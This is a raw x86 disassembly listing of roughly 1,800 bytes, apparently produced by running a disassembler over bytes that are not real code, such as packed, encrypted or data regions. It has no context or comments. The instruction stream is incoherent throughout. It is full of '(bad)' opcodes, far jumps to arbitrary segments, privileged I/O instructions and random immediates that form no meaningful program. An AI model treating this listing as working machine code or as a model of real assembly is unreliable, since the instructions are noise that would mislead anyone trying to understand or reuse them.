  4ad5b1:	sbb    cl,BYTE PTR [ecx+0x22]
  4ad5b4:	adc    DWORD PTR [esi],eax
  4ad5b6:	fld    QWORD PTR [edx-0x7f]
  4ad5b9:	inc    ebp
  4ad5ba:	or     al,0xc8
  4ad5bc:	retf   
  4ad5bd:	in     eax,0x74
  4ad5bf:	dec    ecx
  4ad5c0:	cli    
  4ad5c1:	ss xchg edi,eax
  4ad5c3:	push   ds
  4ad5c4:	sbb    DWORD PTR [eax],ebx
  4ad5c6:	sub    cl,bl
  4ad5c8:	nop
  4ad5c9:	or     al,0x9c
  4ad5cb:	and    eax,0x1f187751
  4ad5d0:	je     0x4ad5c1
  4ad5d2:	lea    ecx,[esi+0x54]
  4ad5d5:	or     eax,0x637ee777
  4ad5da:	je     0x4ad5a2
  4ad5dc:	mov    WORD PTR [ebp+0x52],cs
  4ad5df:	sti    
  4ad5e0:	add    esi,esi
  4ad5e2:	lea    esi,[eax+esi*8+0x6a10d65c]
  4ad5e9:	in     eax,dx
  4ad5ea:	mov    al,0xc3
  4ad5ec:	cmp    DWORD PTR [eax],ebx
  4ad5ee:	fsubr  DWORD PTR [edx+ecx*1-0x29]
  4ad5f2:	pop    ss
  4ad5f3:	lea    edx,[edx+0x792390b8]
  4ad5f9:	adc    BYTE PTR [ebx],dl
  4ad5fb:	test   cl,ah
  4ad5fd:	rol    BYTE PTR [edx-0x41],cl
  4ad600:	stos   DWORD PTR es:[edi],eax
  4ad601:	sbb    al,0xea
  4ad603:	push   ds
  4ad604:	dec    ecx
  4ad605:	xor    eax,0x3a8b10d8
  4ad60a:	sbb    ebx,DWORD PTR [edx]
  4ad60c:	jmp    FWORD PTR [edx-0x77]
  4ad60f:	test   al,0xfe
  4ad611:	mov    DWORD PTR [eax-0x22378aff],esp
  4ad617:	inc    ebp
  4ad618:	sbb    al,0xd9
  4ad61a:	sar    BYTE PTR [edi-0x5b],0x21
  4ad61e:	sub    al,0x2d
  4ad620:	pop    es
  4ad621:	mov    eax,DWORD PTR [edi+0x7c]
  4ad624:	fstp   QWORD PTR [eax+0x2b]
  4ad627:	or     ebp,edi
  4ad629:	fsubr  st,st(3)
  4ad62b:	or     ebx,esp
  4ad62d:	or     eax,0x9020ed68
  4ad632:	mov    al,ds:0x58780e82
  4ad637:	dec    ebx
  4ad638:	test   BYTE PTR [ebp+0x35],dl
  4ad63b:	test   BYTE PTR [edi+0x1bd68265],0xc2
  4ad642:	mov    esp,0x86a16942
  4ad647:	mov    edx,0xb55a14b9
  4ad64c:	push   es
  4ad64d:	pop    es
  4ad64e:	sub    eax,DWORD PTR [esi+eax*1+0x6c]
  4ad652:	push   ecx
  4ad653:	mov    al,gs:0x22cf1696
  4ad659:	mov    ebx,0x368ee1c
  4ad65e:	push   ss
  4ad65f:	lea    ebp,[eax]
  4ad661:	push   ebp
  4ad662:	push   eax
  4ad663:	and    eax,edi
  4ad665:	test   al,0x53
  4ad667:	push   cs
  4ad668:	inc    DWORD PTR [esi]
  4ad66a:	imul   esp,DWORD PTR [ecx+0x18],0xffffff81
  4ad66e:	scas   al,BYTE PTR es:[edi]
  4ad66f:	jnp    0x4ad68d
  4ad671:	stos   DWORD PTR es:[edi],eax
  4ad672:	mov    ebx,0x92383046
  4ad677:	jnp    0x4ad6e7
  4ad679:	outs   dx,BYTE PTR ds:[esi]
  4ad67a:	mov    ecx,0x8424080
  4ad67f:	cmp    DWORD PTR [esi+0x41],0x31d9b820
  4ad686:	adc    BYTE PTR [ecx-0x64],bh
  4ad689:	add    dh,al
  4ad68b:	xchg   esi,eax
  4ad68c:	or     dl,dl
  4ad68e:	mov    edi,gs
  4ad690:	or     BYTE PTR [edi],bh
  4ad692:	jmp    0x1495:0x80b78906
  4ad699:	lahf   
  4ad69a:	test   BYTE PTR [ecx+0x25],ah
  4ad69d:	js     0x4ad6a0
  4ad69f:	jns    0x4ad718
  4ad6a1:	ins    BYTE PTR es:[edi],dx
  4ad6a2:	push   ebp
  4ad6a3:	sbb    eax,0x5e1e6591
  4ad6a8:	mov    BYTE PTR [ecx],ch
  4ad6aa:	sbb    al,0xf
  4ad6ac:	loopne 0x4ad636
  4ad6ae:	sub    BYTE PTR [ebp+0x17d4ca8d],ah
  4ad6b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ad6b5:	add    eax,0x4ccc833d
  4ad6ba:	in     eax,dx
  4ad6bb:	lahf   
  4ad6bc:	std    
  4ad6bd:	dec    ebx
  4ad6be:	add    al,0x51
  4ad6c0:	add    BYTE PTR [esi+ebx*2],0x85
  4ad6c4:	push   ebx
  4ad6c5:	rol    DWORD PTR [edx],cl
  4ad6c7:	pop    ebx
  4ad6c8:	rcl    BYTE PTR [edi-0x26],1
  4ad6cb:	inc    ebx
  4ad6cc:	sbb    al,ch
  4ad6ce:	in     al,dx
  4ad6cf:	dec    ebx
  4ad6d0:	sbb    al,0x3a
  4ad6d2:	rcl    BYTE PTR [eax+0x221c5a6a],0x20
  4ad6d9:	and    BYTE PTR [ebx+0x650aeb26],ah
  4ad6df:	arpl   WORD PTR [edx+ebx*8],bp
  4ad6e2:	(bad)  
  4ad6e3:	pop    ecx
  4ad6e4:	fwait
  4ad6e5:	gs or  al,ah
  4ad6e8:	inc    eax
  4ad6e9:	xor    BYTE PTR [eax],ah
  4ad6eb:	les    edx,FWORD PTR [ebx+0x1a0535f8]
  4ad6f1:	add    eax,0x58574907
  4ad6f6:	test   BYTE PTR [esi],ah
  4ad6f8:	sub    ch,BYTE PTR [edi+0x415c2d5e]
  4ad6fe:	or     BYTE PTR [eax],0xcb
  4ad701:	adc    al,0x40
  4ad703:	fidivr DWORD PTR ds:0x7880831e
  4ad709:	dec    esi
  4ad70a:	das    
  4ad70b:	ja     0x4ad783
  4ad70d:	xchg   ebp,eax
  4ad70e:	dec    ecx
  4ad70f:	fistp  WORD PTR [esi]
  4ad711:	adc    BYTE PTR [edi],bh
  4ad713:	fs jge 0x4ad72b
  4ad716:	imul   eax,DWORD PTR [ecx+0x51ffbc09],0xd206a4df
  4ad720:	pushf  
  4ad721:	dec    eax
  4ad722:	pop    ecx
  4ad723:	sbb    al,0xa
  4ad725:	or     BYTE PTR [ecx+ebp*1+0x4c],cl
  4ad729:	addr16 jae 0x4ad6cc
  4ad72c:	or     DWORD PTR [edi+0x1d],ecx
  4ad72f:	or     dl,BYTE PTR [eax-0x7]
  4ad732:	cs push eax
  4ad734:	jp     0x4ad7ae
  4ad736:	cmc    
  4ad737:	and    BYTE PTR [ebx],al
  4ad739:	ficom  DWORD PTR ds:0xc3a3038e
  4ad73f:	and    esi,DWORD PTR [ecx+0x8ac8ffa]
  4ad745:	stos   DWORD PTR es:[edi],eax
  4ad746:	ret    
  4ad747:	or     al,0x3f
  4ad749:	pop    ss
  4ad74a:	pop    esp
  4ad74b:	and    BYTE PTR [edi],ah
  4ad74d:	pusha  
  4ad74e:	sbb    eax,0xc1d914ba
  4ad753:	mov    edi,0x58c2d3a9
  4ad758:	in     al,0x83
  4ad75a:	shr    DWORD PTR [ecx+edx*2],0xd2
  4ad75e:	ret    
  4ad75f:	rol    BYTE PTR [ebx],cl
  4ad761:	mov    al,ds:0xa60633fe
  4ad766:	adc    dh,BYTE PTR [ecx-0x27266a2d]
  4ad76c:	push   eax
  4ad76d:	sar    BYTE PTR [ebp+0x3a],1
  4ad770:	or     eax,0x247e2da2
  4ad776:	xor    esi,DWORD PTR [ebp+0x6a65194e]
  4ad77c:	add    eax,0xb95c0f12
  4ad781:	xor    eax,0x46b74220
  4ad786:	pop    esi
  4ad787:	jge    0x4ad7f1
  4ad789:	dec    edi
  4ad78a:	retf   
  4ad78b:	adc    cl,BYTE PTR [eax]
  4ad78d:	jae    0x4ad7e0
  4ad78f:	clc    
  4ad790:	push   ebx
  4ad791:	in     al,0x53
  4ad793:	jo     0x4ad71c
  4ad795:	(bad)  
  4ad796:	pop    esi
  4ad797:	jno    0x4ad7d4
  4ad799:	(bad)  
  4ad79a:	je     0x4ad7a4
  4ad79c:	cs add ch,dl
  4ad79f:	adc    al,ah
  4ad7a1:	je     0x4ad7a4
  4ad7a3:	push   esi
  4ad7a4:	xchg   esi,eax
  4ad7a5:	pmaxub mm6,QWORD PTR [edx]
  4ad7a8:	mov    edx,0xbe8fc6f
  4ad7ad:	mov    al,0xd7
  4ad7af:	xchg   esp,eax
  4ad7b0:	xor    ecx,DWORD PTR [edi]
  4ad7b2:	xor    bh,BYTE PTR [ebx+0x1e0c782]
  4ad7b8:	je     0x4ad772
  4ad7ba:	ins    BYTE PTR es:[edi],dx
  4ad7bb:	sbb    BYTE PTR [ecx+0x1206c383],dh
  4ad7c1:	fadd   DWORD PTR [edx+0x531c642c]
  4ad7c7:	es ins DWORD PTR es:[edi],dx
  4ad7c9:	outs   dx,BYTE PTR ds:[esi]
  4ad7ca:	jmp    0x67b7:0x7125d3e0
  4ad7d1:	inc    ebx
  4ad7d2:	mov    ds:0xa0e868f3,al
  4ad7d7:	inc    ebp
  4ad7d8:	or     BYTE PTR [esp+ebx*4],cl
  4ad7db:	mov    ah,0xe
  4ad7dd:	and    BYTE PTR [eax],dl
  4ad7df:	xor    eax,0x35833c81
  4ad7e4:	push   ebx
  4ad7e5:	add    eax,0x45612c09
  4ad7ea:	packssdw mm1,QWORD PTR [ebx-0x62c3178c]
  4ad7f1:	fild   DWORD PTR [eax+0x60]
  4ad7f4:	pop    es
  4ad7f5:	inc    ecx
  4ad7f6:	or     al,0x7
  4ad7f8:	xor    eax,0xc3d00068
  4ad7fd:	rcr    BYTE PTR [edx-0x23],cl
  4ad800:	pop    ss
  4ad801:	mov    ds:0x73fd2d0d,eax
  4ad806:	call   FWORD PTR [edi+0x3b]
  4ad809:	sahf   
  4ad80a:	cmp    esp,edx
  4ad80c:	jnp    0x4ad7a1
  4ad80e:	sub    BYTE PTR [ebx+edi*8],cl
  4ad811:	add    edi,DWORD PTR [esp+ebx*1+0x70]
  4ad815:	add    eax,edi
  4ad817:	sbb    ecx,ebx
  4ad819:	inc    eax
  4ad81a:	push   cs
  4ad81b:	(bad)  
  4ad81c:	daa    
  4ad81d:	cmp    dl,BYTE PTR ds:0x4bf03440
  4ad823:	mov    esp,0xa7ffa36
  4ad828:	push   eax
  4ad829:	sub    BYTE PTR [ecx-0x7d],dl
  4ad82c:	jle    0x4ad8a6
  4ad82e:	add    esi,DWORD PTR [esi+0x1f]
  4ad831:	lea    edi,[esi+0x47]
  4ad834:	rcl    DWORD PTR [edx],0xd9
  4ad837:	xor    dl,ch
  4ad839:	inc    edi
  4ad83a:	out    0x28,eax
  4ad83c:	adc    DWORD PTR [ecx+0x4f],edi
  4ad83f:	or     al,0x9f
  4ad841:	retf   
  4ad842:	dec    edx
  4ad843:	shr    esi,1
  4ad845:	fwait
  4ad846:	cmp    eax,0x9505e577
  4ad84b:	add    al,BYTE PTR [edx+edi*8+0x1adb3305]
  4ad852:	(bad)  
  4ad853:	mov    DWORD PTR [eax+0x64],esi
  4ad856:	mov    ecx,0x36e1eac
  4ad85b:	sub    DWORD PTR [ebx-0x5e],ebp
  4ad85e:	xor    BYTE PTR [ebp+0x5a6b7950],dh
  4ad864:	sub    BYTE PTR [ebx+0x4],dl
  4ad867:	cmp    al,0x40
  4ad869:	dec    esi
  4ad86a:	inc    esp
  4ad86b:	mov    DWORD PTR [esi+0x48],edi
  4ad86e:	cwde   
  4ad86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ad870:	mov    ch,0xa5
  4ad872:	dec    esp
  4ad873:	push   cs
  4ad874:	pusha  
  4ad875:	add    al,0x64
  4ad877:	push   0x412540fe
  4ad87c:	push   edx
  4ad87d:	jo     0x4ad89e
  4ad87f:	jle    0x4ad8fd
  4ad881:	in     al,0xa3
  4ad883:	and    eax,0xbee3c0b1
  4ad888:	inc    ebx
  4ad889:	or     eax,0xc4960540
  4ad88e:	rcl    DWORD PTR [eax+0x6f],0x4e
  4ad892:	mov    edi,0x9e887860
  4ad897:	nop
  4ad898:	(bad)
  4ad89b:	in     eax,0x8
  4ad89d:	dec    ebp
  4ad89e:	leave  
  4ad89f:	add    al,0x8
  4ad8a1:	or     eax,0x248f6c79
  4ad8a6:	adc    edi,DWORD PTR [eax]
  4ad8a8:	jmp    0xeac2:0xbf140637
  4ad8af:	xchg   DWORD PTR [ecx],ebp
  4ad8b1:	adc    bh,bh
  4ad8b3:	add    bh,ah
  4ad8b5:	fsubr  QWORD PTR [eax+0x69]
  4ad8b8:	or     edi,DWORD PTR [ebx+0x3b]
  4ad8bb:	xchg   esp,eax
  4ad8bc:	repz inc edi
  4ad8be:	lea    esi,[esi]
  4ad8c0:	pop    esp
  4ad8c1:	daa    
  4ad8c2:	fimul  DWORD PTR [ebx+0x68]
  4ad8c5:	repz ds add al,0x5c
  4ad8c9:	out    dx,al
  4ad8ca:	sbb    al,BYTE PTR [ecx]
  4ad8cc:	push   ebx
  4ad8cd:	inc    ecx
  4ad8ce:	or     DWORD PTR [eax-0x73],ecx
  4ad8d1:	inc    ecx
  4ad8d2:	pop    eax
  4ad8d3:	int3   
  4ad8d4:	in     eax,dx
  4ad8d5:	xor    eax,0x8f0bbd8d
  4ad8da:	retf   0xed29
  4ad8dd:	inc    esi
  4ad8de:	or     esp,DWORD PTR [ebx+ebx*4]
  4ad8e1:	and    DWORD PTR [ecx+0x6a],ebp
  4ad8e4:	mov    ds:0x40182ab4,al
  4ad8e9:	pop    ds
  4ad8ea:	dec    eax
  4ad8eb:	and    eax,0xd54da903
  4ad8f0:	xchg   ecx,eax
  4ad8f1:	sbb    ah,BYTE PTR [eax+0x81b2b42]
  4ad8f7:	pop    edi
  4ad8f8:	fadd   QWORD PTR [edi]
  4ad8fa:	mov    ds:0x690b980c,eax
  4ad8ff:	mov    DWORD PTR [eax+0xb],ebp
  4ad902:	test   DWORD PTR [eax],0x95208742
  4ad908:	push   eax
  4ad909:	jne    0x4ad8ce
  4ad90b:	push   ebx
  4ad90c:	jp     0x4ad926
  4ad90e:	ins    BYTE PTR es:[edi],dx
  4ad90f:	inc    eax
  4ad910:	aam    0x1b
  4ad912:	sahf   
  4ad913:	test   BYTE PTR [ebp+0x4b],cl
  4ad916:	mov    edx,0x588ebf03
  4ad91b:	push   eax
  4ad91c:	push   cs
  4ad91d:	add    esp,DWORD PTR [ecx]
  4ad91f:	ins    BYTE PTR es:[edi],dx
  4ad920:	or     al,0x90
  4ad922:	test   al,0xe9
  4ad924:	mov    edx,DWORD PTR ds:0xe1a0b506
  4ad92a:	popa   
  4ad92b:	mov    dh,0x4
  4ad92d:	pop    ebx
  4ad92e:	pushf  
  4ad92f:	xor    eax,0x824fb855
  4ad934:	mov    eax,0xb1f481eb
  4ad939:	out    0x32,al
  4ad93b:	mov    dh,dh
  4ad93d:	add    edi,DWORD PTR [eax]
  4ad93f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ad940:	and    al,al
  4ad942:	or     eax,0xc298128b
  4ad947:	xchg   esi,eax
  4ad948:	push   ecx
  4ad949:	cmp    eax,0x67df85b0
  4ad94e:	into   
  4ad94f:	mov    ecx,0xec4d5d08
  4ad954:	inc    eax
  4ad955:	xor    BYTE PTR [ecx],cl
  4ad957:	mov    bh,0xfb
  4ad959:	ret    0x5278
  4ad95c:	lods   al,BYTE PTR ds:[esi]
  4ad95d:	icebp  
  4ad95e:	pop    esp
  4ad95f:	jge    0x4ad964
  4ad961:	loopne 0x4ad90a
  4ad963:	push   esi
  4ad964:	inc    esp
  4ad965:	in     al,dx
  4ad966:	push   0x769958
  4ad96b:	jle    0x4ad998
  4ad96d:	or     al,0x81
  4ad96f:	ror    esi,0x1e
  4ad972:	fs push es
  4ad974:	out    0x31,eax
  4ad976:	gs mov edx,0xd29890f1
  4ad97c:	cdq    
  4ad97d:	std    
  4ad97e:	push   eax
  4ad97f:	cmp    al,0x88
  4ad981:	mov    al,ds:0xd102c81f
  4ad986:	pop    esi
  4ad987:	or     BYTE PTR [ebx-0x5a0e198c],dh
  4ad98d:	add    DWORD PTR ds:0xc07662e8,0xffffffb0
  4ad994:	rcl    BYTE PTR [edi],1
  4ad996:	ds mov edx,0xc83a03ac
  4ad99c:	int3   
  4ad99d:	das    
  4ad99e:	xchg   BYTE PTR gs:[esi-0x60],cl
  4ad9a2:	ds push 0xe941afdb
  4ad9a8:	es popf 
  4ad9aa:	add    al,0x9f
  4ad9ac:	push   0x13cc7512
  4ad9b1:	hlt    
  4ad9b2:	je     0x4ada0b
  4ad9b4:	sbb    eax,0x18567322
  4ad9b9:	push   esp
  4ad9ba:	iret   
  4ad9bb:	add    DWORD PTR [edx-0x23],ebp
  4ad9be:	pusha  
  4ad9bf:	push   cs
  4ad9c0:	enter  0x3770,0x9
  4ad9c4:	imul   edx,DWORD PTR [edi+eax*1],0x5
  4ad9c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ad9c9:	jge    0x4ada03
  4ad9cb:	xchg   edi,eax
  4ad9cc:	cmp    BYTE PTR [edx+0x58],cl
  4ad9cf:	xor    BYTE PTR [eax],ch
  4ad9d1:	pop    edi
  4ad9d2:	fldenv [esi]
  4ad9d4:	dec    ebx
  4ad9d5:	cli    
  4ad9d6:	adc    DWORD PTR [ecx-0x3f9fbf],ecx
  4ad9dc:	rcl    bl,1
  4ad9de:	pushf  
  4ad9df:	popa   
  4ad9e0:	bound  esi,QWORD PTR [ebp-0x76]
  4ad9e3:	mov    eax,0x23c40370
  4ad9e8:	or     eax,0x26d5c1ec
  4ad9ed:	dec    esp
  4ad9ee:	ss enter 0x8c2c,0xf
  4ad9f3:	cwde   
  4ad9f4:	add    cl,ch
  4ad9f6:	xchg   edx,eax
  4ad9f7:	mov    ebx,0x408b0149
  4ad9fc:	adc    BYTE PTR [edx+ecx*2+0x8],0x5b
  4ada01:	mov    BYTE PTR [ebp+edx*8+0x55],dh
  4ada05:	addr16 mov bl,0xbe
  4ada08:	push   0xe5aa8f22
  4ada0d:	pop    eax
  4ada0e:	add    DWORD PTR [edx+0x14],ecx
  4ada11:	aam    0x8a
  4ada13:	or     esi,0x89e9a3b5
  4ada19:	dec    ebx
  4ada1a:	xchg   edx,eax
  4ada1b:	call   0x6801:0xa23080d4
  4ada22:	inc    ebx
  4ada23:	push   ss
  4ada24:	add    al,0x97
  4ada26:	imul   ebx,DWORD PTR [edx],0x11
  4ada29:	es or  bh,dh
  4ada2c:	mov    ecx,0xe4a51a99
  4ada31:	pop    ss
  4ada32:	test   bh,ch
  4ada34:	ret    0xc3fd
  4ada37:	ss push ebp
  4ada39:	clc    
  4ada3a:	in     eax,dx
  4ada3b:	ss leave 
  4ada3d:	shr    BYTE PTR [ebp+0x63],0x78
  4ada41:	rol    BYTE PTR [ebp+ecx*4+0x7940250f],cl
  4ada48:	sub    BYTE PTR [ebx],al
  4ada4a:	sub    al,0x3
  4ada4c:	mov    BYTE PTR [edi+0x3641f6cf],bh
  4ada52:	inc    eax
  4ada53:	ror    BYTE PTR ds:[edx],0xc2
  4ada57:	mov    DWORD PTR [ecx],ebx
  4ada59:	adc    BYTE PTR [ecx-0x4c],dl
  4ada5c:	mov    eax,edx
  4ada5e:	xor    cl,bl
  4ada60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ada61:	in     al,dx
  4ada62:	mov    eax,0x8280d937
  4ada67:	std    
  4ada68:	js     0x4ada91
  4ada6a:	sub    BYTE PTR [esp+ecx*1+0x7c54401b],al
  4ada71:	pop    esi
  4ada72:	jle    0x4adab5
  4ada74:	js     0x4adab9
  4ada76:	out    0x38,eax
  4ada78:	jns    0x4ada98
  4ada7a:	or     al,BYTE PTR [esi]
  4ada7c:	fild   WORD PTR [esi]
  4ada7e:	stc    
  4ada7f:	push   es
  4ada80:	sbb    DWORD PTR [esi],ecx
  4ada82:	pushf  
  4ada83:	fs pusha 
  4ada85:	pop    esi
  4ada86:	mov    edi,0xc8c02c1f
  4ada8b:	adc    al,BYTE PTR ds:0xfdb82bdc
  4ada91:	jge    0x4adaa1
  4ada93:	mov    DWORD PTR [ebx+0x1b792bf8],edi
  4ada99:	mov    ch,0xb1
  4ada9b:	inc    esp
  4ada9c:	xor    al,cl
  4ada9e:	jg     0x4ada8e
  4adaa0:	cdq    
  4adaa1:	mov    ch,0x25
  4adaa3:	mov    ah,0x4e
  4adaa5:	mov    edx,0xa01a370
  4adaaa:	adc    BYTE PTR [esi],dh
  4adaac:	cwde   
  4adaad:	and    BYTE PTR [ebp+0x4328b7fb],al
  4adab3:	jns    0x4adae5
  4adab5:	adc    BYTE PTR [eax],dh
  4adab7:	ins    BYTE PTR es:[edi],dx
  4adab8:	stc    
  4adab9:	aas    
  4adaba:	in     al,dx
  4adabb:	fsub   QWORD PTR ds:0xbaed3cac
  4adac1:	hlt    
  4adac2:	cmp    al,0x57
  4adac4:	sbb    al,0xf
  4adac6:	mov    BYTE PTR [esi],bh
  4adac8:	ins    BYTE PTR es:[edi],dx
  4adac9:	loopne 0x4adae7
  4adacb:	aas    
  4adacc:	int3   
  4adacd:	aaa    
  4adace:	pop    ebp
  4adacf:	and    BYTE PTR [esi+eax*4],dh
  4adad2:	rcr    BYTE PTR [eax],0xd2
  4adad5:	sar    DWORD PTR [eax+0x8],0x18
  4adad9:	jmp    0xe84:0xb2292c50
  4adae0:	push   0x64f21f01
  4adae5:	or     DWORD PTR ds:0x14bad6de,ebx
  4adaeb:	or     DWORD PTR [esi],eax
  4adaed:	xor    ecx,0x78
  4adaf0:	ss pop eax
  4adaf2:	push   edx
  4adaf3:	inc    ecx
  4adaf4:	push   eax
  4adaf5:	rol    DWORD PTR [ebp-0x7c],1
  4adaf8:	or     ebp,esi
  4adafa:	cmp    eax,DWORD PTR [edx]
  4adafc:	shl    BYTE PTR [eax+0x6],1
  4adaff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4adb00:	pusha  
  4adb01:	repz push eax
  4adb03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4adb04:	inc    esi
  4adb05:	out    dx,al
  4adb06:	push   esi
  4adb07:	jge    0x4adae4
  4adb09:	fistp  DWORD PTR [edx-0x498dd38f]
  4adb0f:	jmp    0x4317ea38
  4adb14:	xor    BYTE PTR [eax+0x4d1d2814],bl
  4adb1a:	dec    esp
  4adb1b:	mov    cs,WORD PTR [eax]
  4adb1d:	xchg   ebx,eax
  4adb1e:	(bad)  
  4adb1f:	sub    cl,BYTE PTR [ebx+0x41]
  4adb22:	mov    bh,0x40
  4adb24:	ds int 0x47
  4adb27:	cld    
  4adb28:	dec    edx
  4adb29:	mov    eax,ds:0x1e0c2900
  4adb2e:	add    BYTE PTR [ebx-0x4a76a2fa],0x2e
  4adb35:	cmp    ch,bl
  4adb37:	mov    ds:0x304112b0,eax
  4adb3c:	xor    edx,DWORD PTR [edx]
  4adb3e:	ss pusha 
  4adb40:	(bad)  
  4adb41:	mov    al,ds:0x52ee36a9
  4adb46:	jo     0x4adb0c
  4adb48:	stc    
  4adb49:	dec    eax
  4adb4a:	xlat   BYTE PTR ds:[ebx]
  4adb4b:	xchg   BYTE PTR [esi-0x7e],cl
  4adb4e:	in     eax,0x1b
  4adb50:	xchg   esp,eax
  4adb51:	outs   dx,BYTE PTR ds:[esi]
  4adb52:	push   eax
  4adb53:	pop    ebx
  4adb54:	mov    BYTE PTR [ecx-0x5f],al
  4adb57:	mov    ecx,0x11988770
  4adb5c:	pop    esp
  4adb5d:	sub    al,0x52
  4adb5f:	sbb    eax,0x914b7ff6
  4adb64:	rcl    edx,0x6c
  4adb67:	lods   al,BYTE PTR ds:[esi]
  4adb68:	(bad)  
  4adb69:	push   eax
  4adb6a:	out    0x44,eax
  4adb6c:	or     BYTE PTR [esi-0x8],0x4d
  4adb70:	cld    
  4adb71:	mov    al,0xde
  4adb73:	ins    BYTE PTR es:[edi],dx
  4adb74:	test   al,0x85
  4adb76:	add    esp,eax
  4adb78:	mov    esi,0x9f842779
  4adb7d:	clc    
  4adb7e:	and    BYTE PTR [esi+0x21],bh
  4adb81:	inc    edi
  4adb82:	push   eax
  4adb83:	push   ecx
  4adb84:	mov    BYTE PTR [ecx+ebp*4],cl
  4adb87:	inc    ebx
  4adb88:	sbb    ebp,eax
  4adb8a:	xchg   ah,dl
  4adb8c:	sub    eax,0xfe0b25a1
  4adb91:	sar    DWORD PTR [ebp+0x79],1
  4adb94:	jae    0x4adbd7
  4adb96:	jo     0x4adb99
  4adb98:	shl    BYTE PTR [eax+0x69b93780],1
  4adb9e:	pusha  
  4adb9f:	push   esp
  4adba0:	cmp    esp,ebx
  4adba2:	cld    
  4adba3:	push   ss
  4adba4:	cmp    edx,0x6e
  4adba7:	pusha  
  4adba8:	add    ebp,ebp
  4adbaa:	sbb    dh,BYTE PTR [ebp+0x11]
  4adbad:	test   BYTE PTR [ebx+0x45a0bdd],bh
  4adbb3:	and    DWORD PTR [ebx+0x1e24d4ed],esi
  4adbb9:	sub    bh,BYTE PTR [eax+0x202d1b3e]
  4adbbf:	sbb    BYTE PTR [edx+0x37],al
  4adbc2:	jo     0x4adbe1
  4adbc4:	dec    eax
  4adbc5:	add    esi,edx
  4adbc7:	and    al,0xce
  4adbc9:	(bad)  
  4adbca:	lods   eax,DWORD PTR ds:[esi]
  4adbcb:	mov    WORD PTR [esi],ax
  4adbce:	mov    edi,DWORD PTR [eax]
  4adbd0:	dec    edx
  4adbd1:	push   eax
  4adbd2:	popf   
  4adbd3:	adc    al,0xc6
  4adbd5:	cmp    ah,al
  4adbd7:	les    ebx,FWORD PTR [ecx+0x1850d0e8]
  4adbdd:	sub    al,0x2
  4adbdf:	push   cs
  4adbe0:	cmp    edx,DWORD PTR [ebx+0x6ce49282]
  4adbe6:	adc    bh,BYTE PTR [edi]
  4adbe8:	test   al,0x2
  4adbea:	add    BYTE PTR [esi-0x76],dl
  4adbed:	data16 and al,0x8d
  4adbf0:	push   ecx
  4adbf1:	jmp    0x3de:0x6e24fd60
  4adbf8:	ja     0x4adc18
  4adbfa:	in     al,0x21
  4adbfc:	inc    ebp
  4adbfd:	push   eax
  4adbfe:	sar    ch,0x87
  4adc01:	iret   
  4adc02:	jmp    0x4adc14
  4adc04:	mov    ecx,0x568c0d13
  4adc09:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4adc0b:	retf   0xab4
  4adc0e:	xchg   esp,eax
  4adc0f:	ror    BYTE PTR [eax+eax*4],1
  4adc12:	iret   
  4adc13:	int3   
  4adc14:	or     cl,BYTE PTR [eax+edx*1+0xa]
  4adc18:	lock or al,0x9e
  4adc1b:	dec    ebx
  4adc1c:	push   cs
  4adc1d:	sub    ah,BYTE PTR [ecx+0x40]
  4adc20:	lock push bx
  4adc23:	xlat   BYTE PTR ds:[ebx]
  4adc24:	popf   
  4adc25:	imul   ebp,ecx,0xffffffa2
  4adc28:	inc    ebp
  4adc29:	pop    esp
  4adc2a:	fcmovne st,st(6)
  4adc2d:	xchg   DWORD PTR ds:0x9825a6f,ebx
  4adc33:	and    DWORD PTR [esi+0x1c83ed7],ebx
  4adc39:	mov    edi,edi
  4adc3b:	mov    ah,0x20
  4adc3d:	hlt    
  4adc3e:	mov    ebx,0x68c6c206
  4adc43:	push   esi
  4adc44:	stos   BYTE PTR es:[edi],al
  4adc45:	jo     0x4adcc6
  4adc47:	mov    al,0xc
  4adc49:	sub    DWORD PTR [edi*1-0x3dca0aff],esp
  4adc50:	and    DWORD PTR [eiz*4+0x56f8ff53],esp
  4adc57:	dec    esp
  4adc58:	scas   al,BYTE PTR es:[edi]
  4adc59:	add    ah,BYTE PTR [eax-0x7c]
  4adc5c:	xchg   DWORD PTR ds:0x6d8ab002,esp
  4adc62:	or     eax,0xae005580
  4adc67:	mov    DWORD PTR [edi],eax
  4adc69:	outs   dx,DWORD PTR ds:[esi]
  4adc6a:	jne    0x4adcb5
  4adc6c:	(bad)  
  4adc6d:	xchg   ebp,eax
  4adc6e:	and    DWORD PTR [bp+di],edx
  4adc71:	xor    al,0x8b
  4adc73:	ret    0x3d5b
  4adc76:	sbb    bh,dh
  4adc78:	push   ss
  4adc79:	mov    cl,0x92
  4adc7b:	adc    esp,DWORD PTR [ebp+0x157e9c]
  4adc81:	adc    eax,0x734ddd48
  4adc86:	ror    BYTE PTR [eax],cl
  4adc88:	pop    edx
  4adc89:	and    dl,BYTE PTR [eax]
  4adc8b:	adc    BYTE PTR [ecx*2+0x141434d3],dh
  4adc92:	sbb    BYTE PTR [eax],bl
  4adc94:	sbb    al,0x6b
  4adc96:	inc    edx
  4adc97:	dec    ebp
  4adc98:	rcr    DWORD PTR [eax+eiz*1],cl
  4adc9b:	and    ch,bl
  4adc9d:	push   eax
  4adc9e:	fwait
  4adc9f:	(bad)  
  4adca0:	mov    ah,0x22
  4adca2:	sub    BYTE PTR [eax],ch
  4adca4:	push   ss
  4adca5:	sub    al,0x2c
  4adca7:	dec    DWORD PTR [ebp-0x2d]
  4adcaa:	mov    ah,0x3f
  4adcac:	and    BYTE PTR [eax],dh
  4adcae:	mov    BYTE PTR [esi+0x30],dl
  4adcb1:	pop    eax
  4adcb2:	xor    al,0x34
  4adcb4:	cmp    BYTE PTR [eax],bh
  4adcb6:	outs   dx,BYTE PTR ds:[esi]
  4adcb7:	call   0x4040:0x3c3c34d6
  4adcbe:	inc    eax
  4adcbf:	lea    eax,[edi+0x44]
  4adcc2:	(bad)  
  4adcc3:	ds or  eax,0x1144a210
  4adcc9:	mov    ecx,0x3b1e5434
  4adcce:	and    BYTE PTR [eax-0x61],0x58
  4adcd2:	pop    eax
  4adcd3:	push   ecx
  4adcd4:	inc    esp
